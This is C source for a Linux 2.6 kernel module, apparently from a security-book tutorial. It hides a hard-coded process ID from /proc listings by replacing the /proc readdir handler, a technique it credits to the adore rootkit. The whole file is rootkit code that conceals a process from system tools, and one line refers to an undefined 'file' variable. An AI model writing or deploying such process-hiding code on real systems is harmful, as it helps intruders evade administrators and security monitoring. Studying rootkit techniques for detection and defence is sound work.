/*
Hide process id module based on old implementation of adore rootkit
(Linux kernel 2.6)

Based on tutorial presented in Network Security Tools by J. Clarke and
N. Dhanjani
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <net/sock.h>

#define HIDEPID 4781

typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_proc_readdir=NULL;
filldir_t proc_filldir=NULL;

int adore_atoi(const char *str)
{
  int ret = 0, mul = 1;
  const char *ptr;
  for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
  ptr--;
  while (ptr >= str)
  {
    if (*ptr < '0' || *ptr > '9')
      break;
      ret += (*ptr - '0') * mul;
      mul *= 10;
      ptr--;
  }
  return ret;
}

int my_proc_filldir (void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
  if(adore_atoi(name) == HIDEPID)
  {
    return 0;
  }
  return proc_filldir(buf, name, nlen, off, ino, x);
}

int my_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
  int r=0;

  proc_filldir = filldir;

  r = orig_proc_readdir(fp, buf, my_proc_filldir);

  return r;
}

int hide_pid(readdir_t *orig_readdir, readdir_t new_readdir)
{
  struct file *filep;

  if((filep = filp_open("/proc", O_RDONLY, 0)) == NULL)
  {
    return -1;
  }

  if(orig_readdir)

  *orig_readdir = file->f_op->readdir;

  filep->f_op->readdir=new_readdir;

  filp_close(filep, 0);

  return 0;
}

int restore (readdir_t orig_readdir)
{
  struct file *filep;

  if ((filep = filp_open("/proc", O_RDONLY, 0)) == NULL)
  {
    return -1;
  }

  filep->f_op->readdir = orig_readdir;

  filp_close(filep, 0);

  return 0;
}

static int __init myinit (void)
{
  hide_pid(&orig_proc_readdir, my_proc_readdir);

  return 0;
}

static void myexit(void)
{
  restore(orig_proc_readdir);
}

module_init(myinit);
module_exit(myexit);

MODULE_LICENSE("GPL");
